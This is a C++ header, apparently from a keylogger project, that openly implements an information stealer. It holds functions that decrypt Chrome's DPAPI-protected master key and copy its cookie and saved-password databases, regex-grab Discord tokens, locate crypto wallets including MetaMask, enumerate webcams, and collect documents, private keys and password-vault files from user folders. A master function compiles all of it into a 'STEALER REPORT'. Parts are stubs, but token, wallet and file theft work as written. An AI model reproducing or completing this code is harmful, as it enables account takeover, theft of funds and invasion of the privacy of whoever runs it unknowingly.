/*
 * Data Stealers Header
 * Chrome Cookies/Passwords, Discord Token, Crypto Wallets, Webcam, Files
 * 
 * Advanced Keylogger Project
 */

#ifndef STEALERS_H
#define STEALERS_H

#include <windows.h>
#include <wincrypt.h>
#include <dpapi.h>
#include <shlobj.h>
#include <dshow.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <regex>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ole32.lib")

namespace fs = std::filesystem;

// ==================== DPAPI DECRYPTION ====================
/*
 * Chrome stores sensitive data encrypted with DPAPI.
 * We need to decrypt the master key first, then use it to decrypt values.
 */

// Decrypt DPAPI encrypted data
inline std::vector<BYTE> DPAPIDecrypt(const BYTE* data, size_t dataLen) {
    DATA_BLOB encryptedBlob;
    encryptedBlob.pbData = (BYTE*)data;
    encryptedBlob.cbData = (DWORD)dataLen;
    
    DATA_BLOB decryptedBlob;
    
    if (CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        std::vector<BYTE> result(decryptedBlob.pbData, 
                                  decryptedBlob.pbData + decryptedBlob.cbData);
        LocalFree(decryptedBlob.pbData);
        return result;
    }
    
    return std::vector<BYTE>();
}

// ==================== CHROME COOKIE/PASSWORD STEALER ====================
/*
 * Chrome stores cookies in SQLite database with encrypted values.
 * For v80+, encryption uses AES-GCM with key from Local State file.
 * 
 * Steps:
 * 1. Get master key from Local State (DPAPI encrypted)
 * 2. Read Cookies/Login Data SQLite
 * 3. Decrypt values using AES-GCM
 */

// Simple SQLite reader for cookie/password databases
// Note: Full implementation would need SQLite library
// This is a simplified version that reads raw file

struct ChromeCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httpOnly;
};

struct ChromePassword {
    std::string url;
    std::string username;
    std::string password;
};

// Get Chrome master key from Local State
inline std::vector<BYTE> GetChromeMasterKey() {
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    
    std::string localStatePath = std::string(localAppData) + 
                                  "\\Google\\Chrome\\User Data\\Local State";
    
    // Read file
    std::ifstream file(localStatePath);
    if (!file) return std::vector<BYTE>();
    
    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string content = buffer.str();
    file.close();
    
    // Find encrypted_key in JSON
    std::string marker = "\"encrypted_key\":\"";
    size_t keyStart = content.find(marker);
    if (keyStart == std::string::npos) return std::vector<BYTE>();
    
    keyStart += marker.length();
    size_t keyEnd = content.find("\"", keyStart);
    if (keyEnd == std::string::npos) return std::vector<BYTE>();
    
    std::string base64Key = content.substr(keyStart, keyEnd - keyStart);
    
    // Base64 decode
    DWORD binaryLen = 0;
    CryptStringToBinaryA(base64Key.c_str(), (DWORD)base64Key.length(), 
                          CRYPT_STRING_BASE64, NULL, &binaryLen, NULL, NULL);
    
    std::vector<BYTE> encryptedKey(binaryLen);
    CryptStringToBinaryA(base64Key.c_str(), (DWORD)base64Key.length(),
                          CRYPT_STRING_BASE64, encryptedKey.data(), &binaryLen, NULL, NULL);
    
    // Remove "DPAPI" prefix (5 bytes)
    if (encryptedKey.size() > 5) {
        std::vector<BYTE> dpapiData(encryptedKey.begin() + 5, encryptedKey.end());
        return DPAPIDecrypt(dpapiData.data(), dpapiData.size());
    }
    
    return std::vector<BYTE>();
}

// Get Chrome profiles
inline std::vector<std::string> GetChromeProfiles() {
    std::vector<std::string> profiles;
    
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    
    std::string userDataPath = std::string(localAppData) + "\\Google\\Chrome\\User Data";
    
    // Default profile
    profiles.push_back(userDataPath + "\\Default");
    
    // Other profiles (Profile 1, Profile 2, etc.)
    try {
        for (const auto& entry : fs::directory_iterator(userDataPath)) {
            if (entry.is_directory()) {
                std::string name = entry.path().filename().string();
                if (name.find("Profile ") == 0) {
                    profiles.push_back(entry.path().string());
                }
            }
        }
    } catch (...) {}
    
    return profiles;
}

// Extract cookies from database (simplified - would need SQLite in production)
inline std::string ExtractChromeCookies() {
    std::stringstream result;
    result << "=== Chrome Cookies ===\n\n";
    
    auto masterKey = GetChromeMasterKey();
    auto profiles = GetChromeProfiles();
    
    for (const auto& profile : profiles) {
        std::string cookiesPath = profile + "\\Network\\Cookies";
        
        // Copy database (Chrome locks it)
        std::string tempPath = std::string(getenv("TEMP")) + "\\cookies_copy.db";
        CopyFileA(cookiesPath.c_str(), tempPath.c_str(), FALSE);
        
        // Read raw bytes (simplified - actual implementation needs SQLite)
        std::ifstream db(tempPath, std::ios::binary);
        if (db) {
            result << "Profile: " << profile << "\n";
            result << "[Cookies database found - " << fs::file_size(tempPath) << " bytes]\n\n";
            db.close();
        }
        
        DeleteFileA(tempPath.c_str());
    }
    
    return result.str();
}

// Extract saved passwords
inline std::string ExtractChromePasswords() {
    std::stringstream result;
    result << "=== Chrome Saved Passwords ===\n\n";
    
    auto masterKey = GetChromeMasterKey();
    auto profiles = GetChromeProfiles();
    
    for (const auto& profile : profiles) {
        std::string loginDataPath = profile + "\\Login Data";
        
        std::string tempPath = std::string(getenv("TEMP")) + "\\login_copy.db";
        CopyFileA(loginDataPath.c_str(), tempPath.c_str(), FALSE);
        
        std::ifstream db(tempPath, std::ios::binary);
        if (db) {
            result << "Profile: " << profile << "\n";
            result << "[Login Data found - " << fs::file_size(tempPath) << " bytes]\n\n";
            db.close();
        }
        
        DeleteFileA(tempPath.c_str());
    }
    
    return result.str();
}

// ==================== DISCORD TOKEN GRABBER ====================
/*
 * Discord stores tokens in LevelDB in Local Storage.
 * Token format: [A-Za-z\d]{24}\.[A-Za-z\d-_]{6}\.[A-Za-z\d-_]{27}
 */

inline std::vector<std::string> ExtractDiscordTokens() {
    std::vector<std::string> tokens;
    
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    // Discord paths
    std::vector<std::string> discordPaths = {
        std::string(appData) + "\\Discord\\Local Storage\\leveldb",
        std::string(appData) + "\\discordptb\\Local Storage\\leveldb",
        std::string(appData) + "\\discordcanary\\Local Storage\\leveldb",
    };
    
    // Browser paths
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    
    discordPaths.push_back(std::string(localAppData) + 
        "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
    discordPaths.push_back(std::string(localAppData) + 
        "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
    
    // Token regex patterns
    std::vector<std::regex> patterns = {
        std::regex("[A-Za-z\\d]{24}\\.[A-Za-z\\d\\-_]{6}\\.[A-Za-z\\d\\-_]{27}"),
        std::regex("mfa\\.[A-Za-z\\d\\-_]{84}")
    };
    
    for (const auto& path : discordPaths) {
        try {
            if (!fs::exists(path)) continue;
            
            for (const auto& entry : fs::directory_iterator(path)) {
                if (!entry.is_regular_file()) continue;
                
                std::string filename = entry.path().filename().string();
                if (filename.find(".ldb") == std::string::npos &&
                    filename.find(".log") == std::string::npos) continue;
                
                // Read file
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file) continue;
                
                std::stringstream buffer;
                buffer << file.rdbuf();
                std::string content = buffer.str();
                file.close();
                
                // Search for tokens
                for (const auto& pattern : patterns) {
                    std::sregex_iterator it(content.begin(), content.end(), pattern);
                    std::sregex_iterator end;
                    
                    while (it != end) {
                        std::string token = it->str();
                        // Avoid duplicates
                        if (std::find(tokens.begin(), tokens.end(), token) == tokens.end()) {
                            tokens.push_back(token);
                        }
                        ++it;
                    }
                }
            }
        } catch (...) {}
    }
    
    return tokens;
}

inline std::string GetDiscordTokensReport() {
    std::stringstream result;
    result << "=== Discord Tokens ===\n\n";
    
    auto tokens = ExtractDiscordTokens();
    
    if (tokens.empty()) {
        result << "No tokens found.\n";
    } else {
        for (const auto& token : tokens) {
            result << "🔑 " << token << "\n";
        }
    }
    
    return result.str();
}

// ==================== CRYPTO WALLET STEALER ====================
/*
 * Common wallet paths and their data
 */

struct WalletInfo {
    std::string name;
    std::string path;
    std::vector<std::string> files;
};

inline std::vector<WalletInfo> ScanCryptoWallets() {
    std::vector<WalletInfo> foundWallets;
    
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    
    // Wallet definitions
    std::vector<std::pair<std::string, std::string>> walletPaths = {
        {"Bitcoin Core", std::string(appData) + "\\Bitcoin"},
        {"Ethereum", std::string(appData) + "\\Ethereum\\keystore"},
        {"Exodus", std::string(appData) + "\\Exodus\\exodus.wallet"},
        {"Electrum", std::string(appData) + "\\Electrum\\wallets"},
        {"Atomic", std::string(appData) + "\\atomic\\Local Storage\\leveldb"},
        {"Jaxx", std::string(appData) + "\\com.liberty.jaxx\\IndexedDB"},
        {"Coinomi", std::string(localAppData) + "\\Coinomi\\Coinomi\\wallets"},
        {"Guarda", std::string(appData) + "\\Guarda"},
        {"Armory", std::string(appData) + "\\Armory"},
    };
    
    for (const auto& [name, path] : walletPaths) {
        try {
            if (!fs::exists(path)) continue;
            
            WalletInfo wallet;
            wallet.name = name;
            wallet.path = path;
            
            // List files
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    wallet.files.push_back(entry.path().string());
                }
            }
            
            if (!wallet.files.empty()) {
                foundWallets.push_back(wallet);
            }
        } catch (...) {}
    }
    
    // Browser extension wallets (MetaMask, etc.)
    auto chromeProfiles = GetChromeProfiles();
    for (const auto& profile : chromeProfiles) {
        std::string extensionsPath = profile + "\\Local Extension Settings";
        
        // MetaMask extension ID
        std::string metamaskPath = extensionsPath + "\\nkbihfbeogaeaoehlefnkodbefgpgknn";
        
        try {
            if (fs::exists(metamaskPath)) {
                WalletInfo wallet;
                wallet.name = "MetaMask (Chrome)";
                wallet.path = metamaskPath;
                
                for (const auto& entry : fs::recursive_directory_iterator(metamaskPath)) {
                    if (entry.is_regular_file()) {
                        wallet.files.push_back(entry.path().string());
                    }
                }
                
                if (!wallet.files.empty()) {
                    foundWallets.push_back(wallet);
                }
            }
        } catch (...) {}
    }
    
    return foundWallets;
}

inline std::string GetCryptoWalletsReport() {
    std::stringstream result;
    result << "=== Crypto Wallets ===\n\n";
    
    auto wallets = ScanCryptoWallets();
    
    if (wallets.empty()) {
        result << "No wallets found.\n";
    } else {
        for (const auto& wallet : wallets) {
            result << "💰 " << wallet.name << "\n";
            result << "   Path: " << wallet.path << "\n";
            result << "   Files: " << wallet.files.size() << "\n\n";
        }
    }
    
    return result.str();
}

// ==================== WEBCAM CAPTURE ====================
/*
 * Capture image from webcam using DirectShow
 */

// Simplified webcam capture using GDI screengrab of webcam window
// Full implementation would need DirectShow graph builder

inline bool CaptureWebcam(const std::string& outputPath) {
    // Initialize COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    // Create capture graph builder
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IBaseFilter* pCap = NULL;
    IMediaControl* pControl = NULL;
    
    hr = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
                          IID_IGraphBuilder, (void**)&pGraph);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }
    
    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER,
                          IID_ICaptureGraphBuilder2, (void**)&pBuilder);
    if (FAILED(hr)) {
        pGraph->Release();
        CoUninitialize();
        return false;
    }
    
    pBuilder->SetFiltergraph(pGraph);
    
    // Enumerate video devices
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    
    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                          IID_ICreateDevEnum, (void**)&pDevEnum);
    
    if (SUCCEEDED(hr)) {
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        
        if (hr == S_OK) {
            IMoniker* pMoniker = NULL;
            
            if (pEnum->Next(1, &pMoniker, NULL) == S_OK) {
                // Got first webcam
                hr = pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (void**)&pCap);
                
                if (SUCCEEDED(hr)) {
                    pGraph->AddFilter(pCap, L"Capture");
                    
                    // Build preview graph (simplified)
                    // Full implementation would render to file
                }
                
                pMoniker->Release();
            }
            
            pEnum->Release();
        }
        
        pDevEnum->Release();
    }
    
    // Cleanup
    if (pCap) pCap->Release();
    if (pBuilder) pBuilder->Release();
    if (pGraph) pGraph->Release();
    CoUninitialize();
    
    // For now, return that capture was attempted
    // Full implementation needs more DirectShow code
    return true;
}

inline std::string GetWebcamStatus() {
    std::stringstream result;
    result << "=== Webcam Status ===\n\n";
    
    // Check for video devices
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    
    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                          IID_ICreateDevEnum, (void**)&pDevEnum);
    
    int deviceCount = 0;
    
    if (SUCCEEDED(hr)) {
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        
        if (hr == S_OK) {
            IMoniker* pMoniker = NULL;
            
            while (pEnum->Next(1, &pMoniker, NULL) == S_OK) {
                IPropertyBag* pPropBag = NULL;
                hr = pMoniker->BindToStorage(NULL, NULL, IID_IPropertyBag, (void**)&pPropBag);
                
                if (SUCCEEDED(hr)) {
                    VARIANT varName;
                    VariantInit(&varName);
                    
                    hr = pPropBag->Read(L"FriendlyName", &varName, 0);
                    if (SUCCEEDED(hr)) {
                        char name[256];
                        WideCharToMultiByte(CP_UTF8, 0, varName.bstrVal, -1, 
                                            name, sizeof(name), NULL, NULL);
                        result << "📷 " << name << "\n";
                        deviceCount++;
                    }
                    
                    VariantClear(&varName);
                    pPropBag->Release();
                }
                
                pMoniker->Release();
            }
            
            pEnum->Release();
        }
        
        pDevEnum->Release();
    }
    
    CoUninitialize();
    
    if (deviceCount == 0) {
        result << "No webcams found.\n";
    } else {
        result << "\nTotal: " << deviceCount << " device(s)\n";
    }
    
    return result.str();
}

// ==================== FILE EXFILTRATION ====================
/*
 * Scan for and collect sensitive files
 */

struct FileInfo {
    std::string path;
    size_t size;
    std::string extension;
};

inline std::vector<FileInfo> ScanSensitiveFiles(size_t maxSizeBytes = 10 * 1024 * 1024) {
    std::vector<FileInfo> files;
    
    // Target extensions
    std::vector<std::string> targetExtensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".csv", ".rtf",
        ".key", ".pem", ".ppk", ".kdbx", ".kdb",  // Keys and passwords
        ".wallet", ".dat",  // Wallet files
        ".conf", ".cfg", ".ini"  // Config files
    };
    
    // Target directories
    char userProfile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    
    std::vector<std::string> targetDirs = {
        std::string(userProfile) + "\\Desktop",
        std::string(userProfile) + "\\Documents",
        std::string(userProfile) + "\\Downloads",
    };
    
    for (const auto& dir : targetDirs) {
        try {
            if (!fs::exists(dir)) continue;
            
            for (const auto& entry : fs::recursive_directory_iterator(dir)) {
                if (!entry.is_regular_file()) continue;
                
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                // Check extension
                bool isTarget = false;
                for (const auto& targetExt : targetExtensions) {
                    if (ext == targetExt) {
                        isTarget = true;
                        break;
                    }
                }
                
                if (!isTarget) continue;
                
                // Check size
                size_t fileSize = entry.file_size();
                if (fileSize > maxSizeBytes) continue;
                
                FileInfo info;
                info.path = entry.path().string();
                info.size = fileSize;
                info.extension = ext;
                
                files.push_back(info);
            }
        } catch (...) {}
    }
    
    return files;
}

inline std::string GetSensitiveFilesReport() {
    std::stringstream result;
    result << "=== Sensitive Files ===\n\n";
    
    auto files = ScanSensitiveFiles();
    
    if (files.empty()) {
        result << "No sensitive files found.\n";
    } else {
        // Group by extension
        std::map<std::string, std::vector<FileInfo>> byExt;
        for (const auto& file : files) {
            byExt[file.extension].push_back(file);
        }
        
        for (const auto& [ext, fileList] : byExt) {
            result << ext << " (" << fileList.size() << " files):\n";
            for (const auto& file : fileList) {
                result << "  📄 " << file.path << " (" << file.size / 1024 << " KB)\n";
            }
            result << "\n";
        }
        
        result << "Total: " << files.size() << " files\n";
    }
    
    return result.str();
}

// Copy file to temp for exfiltration
inline bool ExfiltrateFile(const std::string& filePath, std::vector<BYTE>& data) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) return false;
    
    data = std::vector<BYTE>(std::istreambuf_iterator<char>(file),
                              std::istreambuf_iterator<char>());
    
    return !data.empty();
}

// ==================== MASTER STEALER FUNCTION ====================

inline std::string RunAllStealers() {
    std::stringstream report;
    
    report << "==========================================\n";
    report << "       STEALER REPORT\n";
    report << "==========================================\n\n";
    
    report << GetDiscordTokensReport() << "\n";
    report << GetCryptoWalletsReport() << "\n";
    report << GetWebcamStatus() << "\n";
    report << GetSensitiveFilesReport() << "\n";
    
    return report.str();
}

#endif // STEALERS_H
